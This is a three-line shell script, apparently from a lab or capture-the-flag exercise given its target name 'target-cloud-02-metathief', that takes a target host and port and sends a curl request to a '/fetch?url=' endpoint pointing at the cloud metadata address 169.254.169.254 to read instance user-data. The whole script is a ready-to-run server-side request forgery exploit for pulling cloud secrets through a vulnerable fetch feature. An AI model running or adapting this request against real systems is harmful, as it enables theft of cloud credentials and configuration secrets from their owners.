TARGET=${1:-target-cloud-02-metathief}
PORT=${2:-8000}
curl -s "http://$TARGET:$PORT/fetch?url=http://169.254.169.254/latest/user-data"
